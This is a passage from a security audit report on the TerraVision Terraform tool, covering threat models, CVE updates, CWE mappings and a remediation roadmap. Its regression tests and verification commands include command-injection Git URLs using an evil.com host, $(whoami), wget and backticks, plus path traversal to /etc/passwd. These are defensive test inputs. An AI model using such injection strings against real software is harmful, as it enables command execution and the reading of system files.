        tfdata["meta_data"][annotation_node]["label"] = sanitized_label
```

**Priority:** LOW - Cosmetic issue, implement in v1.1

---

## Security Best Practices Violations

### BP-001: Hardcoded AWS Credentials in Tests
**Location:** .github/workflows/lint-and-test.yml:59  
**Issue:** Workflow uses hardcoded AWS role ARN  
**Recommendation:** Use repository secrets, document required permissions

### BP-002: Overly Permissive File Permissions in Tests
**Location:** .github/workflows/lint-and-test.yml:76  
**Issue:** `chmod 777 id_rsa.pub` unnecessarily permissive  
**Recommendation:** Use `chmod 644` for public key files

### BP-003: Missing Security Policy
**Issue:** No SECURITY.md file for vulnerability reporting  
**Recommendation:** Add SECURITY.md with vulnerability disclosure policy

### BP-004: No Dependency Vulnerability Scanning
**Issue:** No automated dependency scanning in CI/CD  
**Recommendation:** Add safety, pip-audit, or Snyk to CI pipeline

### BP-005: Missing Code Signing
**Issue:** Releases not signed with GPG/code signing  
**Recommendation:** Sign releases for supply chain integrity

---

## Dependency Vulnerability Analysis

### Known CVEs in Dependencies

| Package | Current | Recommended | CVEs | Severity |
|---------|---------|-------------|------|----------|
| GitPython | 3.1.31 | 3.1.40 | CVE-2023-40590 | HIGH |
| requests | 2.28.2 | 2.31.0 | Multiple | MEDIUM |
| PyYAML | 6.0 | 6.0.1 | CVE-2020-14343 | LOW |
| debugpy | 1.5.1 | 1.8.0 | Multiple | MEDIUM |
| ipaddr | 2.2.0 | Remove (use stdlib) | Deprecated | INFO |

### Recommended Updates
```bash
# Check for vulnerabilities
poetry run pip-audit

# Update to secure versions
poetry update GitPython requests PyYAML debugpy

# Remove deprecated ipaddr
poetry remove ipaddr
# Update code to use stdlib ipaddress module
```

---

## Threat Model

### Attacker Profiles

**1. Malicious Terraform Module Author**
- **Goal:** Code execution on developer/CI systems
- **Capabilities:** Create malicious Terraform modules, publish to registries
- **Attack Vectors:** 
  - Malicious provider plugins
  - Infinite loops in data sources
  - Path traversal in module sources
  - Command injection via Git URLs

**2. Network Attacker (MITM)**
- **Goal:** Inject malicious modules, steal credentials
- **Capabilities:** Intercept HTTPS traffic, forge certificates
- **Attack Vectors:**
  - MITM registry API requests
  - Inject malicious module sources
  - Capture TFE_TOKEN

**3. Local Attacker**
- **Goal:** Privilege escalation, credential theft
- **Capabilities:** Read local files, monitor processes
- **Attack Vectors:**
  - Read credentials from temp files
  - Symlink attacks on module cache
  - Race conditions in file operations

**4. Supply Chain Attacker**
- **Goal:** Compromise TerraVision distribution
- **Capabilities:** Compromise dependencies, PyPI packages
- **Attack Vectors:**
  - Malicious package versions
  - Typosquatting
  - Compromised maintainer accounts

### Attack Surface Analysis

**High Risk Surfaces:**
1. Git repository cloning (remote code, URLs)
2. Terraform subprocess execution (untrusted Terraform)
3. Registry API requests (credentials, MITM)
4. HCL parsing (malformed input)
5. Module downloads (supply chain)

**Medium Risk Surfaces:**
6. Annotation YAML parsing
7. File system operations (temp files, cache)
8. JSON export (information disclosure)

**Low Risk Surfaces:**
9. Graphviz rendering
10. CLI argument parsing

### Trust Boundaries

```
User Input (CLI)
    ↓
[TRUST BOUNDARY 1: Input Validation]
    ↓
TerraVision Core
    ↓
[TRUST BOUNDARY 2: Subprocess Isolation]
    ↓
External Tools (terraform, git, dot)
    ↓
[TRUST BOUNDARY 3: Network Validation]
    ↓
External Resources (Git repos, registries)
```

**Key Trust Decisions:**
- Trust Terraform binary (must be from HashiCorp)
- Do NOT trust Terraform code/modules (untrusted input)
- Do NOT trust Git repository contents
- Trust PyPI packages (mitigate with hash verification)
- Trust Graphviz binary (system package)

---

## Compliance & Standards

### OWASP Top 10 2021 Relevance

| OWASP Category | Relevance | Findings |
|----------------|-----------|----------|
| A01:2021 Broken Access Control | LOW | No multi-user access control |
| A02:2021 Cryptographic Failures | MEDIUM | SEC-CRIT-002, SEC-HIGH-002 |
| A03:2021 Injection | HIGH | SEC-CRIT-001, SEC-HIGH-001 |
| A04:2021 Insecure Design | MEDIUM | Missing security controls |
| A05:2021 Security Misconfiguration | HIGH | BP-001 through BP-005 |
| A06:2021 Vulnerable Components | HIGH | SEC-HIGH-005 |
| A07:2021 Authentication Failures | MEDIUM | SEC-CRIT-002 |
| A08:2021 Software Integrity | MEDIUM | No code signing, no SBOM |
| A09:2021 Logging Failures | MEDIUM | SEC-LOW-001 |
| A10:2021 Server-Side Request Forgery | LOW | Not applicable (CLI tool) |

### CWE Mappings

- **CWE-78:** OS Command Injection → SEC-CRIT-001, SEC-HIGH-001
- **CWE-200:** Information Disclosure → SEC-CRIT-002, SEC-MED-003
- **CWE-22:** Path Traversal → SEC-HIGH-003
- **CWE-400:** Uncontrolled Resource Consumption → SEC-HIGH-004
- **CWE-327:** Use of Broken Crypto → SEC-HIGH-002
- **CWE-502:** Deserialization of Untrusted Data → SEC-MED-005
- **CWE-362:** Race Condition → SEC-MED-004
- **CWE-59:** Link Following → SEC-MED-007

---

## Security Testing Recommendations

### SAST (Static Application Security Testing)
**Tools:**
- **Bandit:** Python security linter
  ```bash
  poetry add --group dev bandit
  poetry run bandit -r modules/ terravision.py
  ```
- **Semgrep:** Pattern-based code scanning
  ```bash
  semgrep --config=auto modules/ terravision.py
  ```

**Recommended Rules:**
- Command injection patterns
- Hardcoded secrets
- Unsafe file operations
- Missing input validation

### DAST (Dynamic Application Security Testing)
**Approaches:**
- Fuzz testing with malicious Terraform inputs
- Malicious Git URLs
- Invalid HCL structures
- Boundary value testing (very large/small inputs)

### Dependency Scanning
**Tools:**
- **pip-audit:** CVE scanning for Python packages
  ```bash
  poetry run pip-audit
  ```
- **safety:** Check against safety DB
  ```bash
  poetry run safety check
  ```
- **Snyk:** Continuous monitoring (integrate in CI/CD)

### Fuzzing Targets
1. **HCL Parser:** Malformed Terraform files
2. **Git URL Parser:** Edge cases in URL formats
3. **Annotation Parser:** Invalid YAML structures
4. **CLI Arguments:** Boundary values, special characters

### Penetration Testing Scope
**In Scope:**
- Malicious Terraform module injection
- Credential exposure scenarios
- File system security (temp files, cache)
- Network security (MITM, redirect attacks)

**Out of Scope:**
- Physical security
- Social engineering
- Terraform binary vulnerabilities
- System-level exploits

---

## Secure Development Lifecycle Recommendations

### Code Review Security Checklist

**For Every PR:**
- [ ] No hardcoded credentials or secrets
- [ ] Input validation for all external inputs
- [ ] Subprocess calls use list format (not shell=True)
- [ ] Subprocess calls have timeout protection
- [ ] File operations check for symlinks
- [ ] Error messages don't leak sensitive data
- [ ] New dependencies scanned for CVEs
- [ ] Security-relevant changes documented

**For Security-Sensitive Changes:**
- [ ] Threat model updated
- [ ] Security tests added
- [ ] Penetration test performed
- [ ] Security team review completed

### Security Training Needs
1. **Secure Coding in Python:**
   - OWASP Python Security
   - Input validation techniques
   - Safe subprocess usage

2. **Supply Chain Security:**
   - Dependency management
   - Package verification
   - SBOM generation

3. **Terraform Security:**
   - Provider security model
   - State file security
   - Module security best practices

### Secure Coding Standards

**Adopt:**
1. OWASP Secure Coding Practices
2. PEP 668 (Marking Python base environments as "externally managed")
3. SLSA Build Level 3 for releases
4. OpenSSF Scorecard compliance

**Enforce in CI/CD:**
```yaml
# .github/workflows/security.yml
name: Security Checks
on: [push, pull_request]
jobs:
  security:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Run Bandit
        run: poetry run bandit -r modules/
      - name: Run pip-audit
        run: poetry run pip-audit
      - name: Run safety
        run: poetry run safety check
      - name: SAST with Semgrep
        run: semgrep --config=auto .
```

### Security Gate Recommendations

**Pre-Commit Gates:**
- Secrets scanning (detect-secrets, truffleHog)
- SAST (bandit)
- Dependency check (safety)

**Pre-Merge Gates:**
- Security code review approval
- All security tests passing
- No new high/critical vulnerabilities

**Pre-Release Gates:**
- Full penetration test
- Dependency audit
- SBOM generation
- Sign release artifacts

---

## Remediation Roadmap

### Phase 1: Critical Issues (Immediate - v0.9)
**Timeline:** Complete before v0.9 release (Sprint 1-2)

- [ ] **SEC-CRIT-001:** Implement Git URL validation
- [ ] **SEC-CRIT-002:** Add credential sanitization
- [ ] **SEC-HIGH-001:** Add subprocess timeouts
- [ ] **SEC-HIGH-002:** Enable certificate verification
- [ ] **SEC-HIGH-005:** Update all dependencies

**Acceptance Criteria:**
- No credentials in logs or error messages
- All subprocess calls have timeouts
- Git URL validation blocks injection attempts
- HTTPS certificate validation enabled
- Zero high/critical CVEs in dependencies

**Estimated Effort:** 3-4 days (1 sprint)

### Phase 2: High Priority Issues (v1.0)
**Timeline:** Complete during v1.0 development (Sprint 3-5)

- [ ] **SEC-HIGH-003:** Path traversal protection
- [ ] **SEC-HIGH-004:** Resource consumption limits
- [ ] **SEC-MED-001:** Secure temp file creation
- [ ] **SEC-MED-002:** Input validation (workspace, etc.)
- [ ] **SEC-MED-003:** Sanitize debug exports
- [ ] **SEC-MED-005:** HCL input validation

**Acceptance Criteria:**
- Path traversal tests passing
- Resource limits prevent DoS
- Temp files have secure permissions
- All user inputs validated
- Debug exports sanitized

**Estimated Effort:** 5-6 days (2 sprints)

### Phase 3: Medium Priority Issues (v1.1)
**Timeline:** During v1.1 stabilization (Sprint 6-7)

- [ ] **SEC-MED-004:** Fix race conditions
- [ ] **SEC-MED-006:** Redirect validation
- [ ] **SEC-MED-007:** Symlink protection
- [ ] **SEC-LOW-001:** Security logging
- [ ] **SEC-LOW-003:** CLI argument limits

**Acceptance Criteria:**
- Module cache operations atomic
- Redirect chains validated
- Symlinks blocked in file operations
- Security events logged
- CLI argument size limits enforced

**Estimated Effort:** 3-4 days (1 sprint)

### Phase 4: Best Practices & Hardening (v1.2)
**Timeline:** Post-GA improvements (Sprint 8+)

- [ ] **SEC-LOW-004:** Label sanitization
- [ ] **BP-001 through BP-005:** Fix best practice violations
- [ ] Add SECURITY.md
- [ ] Implement code signing
- [ ] Add CI security scanning
- [ ] Generate SBOM
- [ ] OpenSSF Scorecard compliance

**Acceptance Criteria:**
- SECURITY.md published
- Releases signed
- CI includes security gates
- SBOM generated for releases
- Scorecard score > 7.0

**Estimated Effort:** 4-5 days (scattered across releases)

---

## Acceptance Criteria for Security Fixes

### SEC-CRIT-001: Git URL Validation
**Verification:**
```bash
# Test malicious URLs are blocked
terravision draw --source "git::https://evil.com/$(whoami).git"
# Expected: Error message, no command execution

# Test path traversal blocked
terravision draw --source "git::https://github.com/test/repo.git//../../etc/passwd"
# Expected: Error message about path traversal

# Test valid URLs work
terravision draw --source "git::https://github.com/valid/repo.git"
# Expected: Normal operation
```

**Security Regression Tests:**
```python
# tests/security/test_git_url_validation.py
def test_rejects_command_injection():
    malicious_urls = [
        "git::https://evil.com/$(whoami).git",
        "https://evil.com/repo;wget+malware",
        "git::https://evil.com/repo`id`.git",
    ]
    for url in malicious_urls:
        with pytest.raises(ValueError):
            validate_git_url(url)

def test_rejects_path_traversal():
    with pytest.raises(ValueError):
        validate_subfolder("../../etc/passwd", "/tmp/base")
```

### SEC-CRIT-002: Credential Sanitization
**Verification:**
```bash
# Set test credentials
export TFE_TOKEN="test-token-12345"
export AWS_SECRET_ACCESS_KEY="test-secret-key-67890"

# Run with intentional error to trigger logging
terravision draw --source invalid_path --debug 2>&1 | grep -i "token\|secret"
# Expected: No credentials visible in output

# Check exported JSON
terravision graphdata --source ./terraform --outfile test.json
cat test.json | grep -i "password\|secret\|token"
# Expected: Values should be [REDACTED]
```

**Security Regression Tests:**
```python
# tests/security/test_credential_sanitization.py
def test_sanitizes_aws_credentials():
    text = "AWS_SECRET_ACCESS_KEY=ABCD1234567890ABCDEFGHIJ"
    result = sanitize_sensitive_data(text)
    assert "ABCD1234" not in result
    assert "[AWS_SECRET_KEY_REDACTED]" in result

def test_sanitizes_bearer_tokens():
    text = "Authorization: bearer abc123def456"
    result = sanitize_sensitive_data(text)
    assert "abc123def456" not in result
```

### General Security Testing
```python
# tests/security/test_subprocess_security.py
def test_subprocess_has_timeout():
    """Ensure all subprocess calls have timeout protection."""
    # This would be a static analysis test
    pass

def test_no_shell_true():
    """Ensure no subprocess calls use shell=True."""
    # Static analysis to grep for shell=True
    pass

# tests/security/test_file_operations.py
def test_rejects_symlinks():
    """Ensure file operations reject symlinks."""
    pass

def test_temp_files_secure_permissions():
    """Ensure temp files created with 0600 permissions."""
    pass
```

---

## Conclusion

TerraVision's security posture requires immediate attention to critical vulnerabilities (SEC-CRIT-001, SEC-CRIT-002) before the v0.9 release. The application processes untrusted Terraform code and Git repositories, making input validation and credential protection paramount.

**Key Recommendations:**
1. **Immediate:** Implement Git URL validation and credential sanitization (Phase 1)
2. **Before GA (v1.0):** Complete all high-priority remediations (Phase 2)
3. **Ongoing:** Integrate security testing into CI/CD pipeline
4. **Long-term:** Pursue OpenSSF Scorecard compliance and code signing

The remediation roadmap aligns with the product roadmap in ROADMAP.md, ensuring security improvements are integrated into planned releases without disrupting feature development.

**Next Steps:**
1. Review and approve remediation roadmap
2. Create security-focused issues in backlog
3. Assign security champions for each phase
4. Establish vulnerability disclosure policy
5. Set up automated security scanning in CI/CD

---

**Document Version:** 1.0  
**Last Updated:** 2025-01-26  
**Next Review:** Before v0.9 release
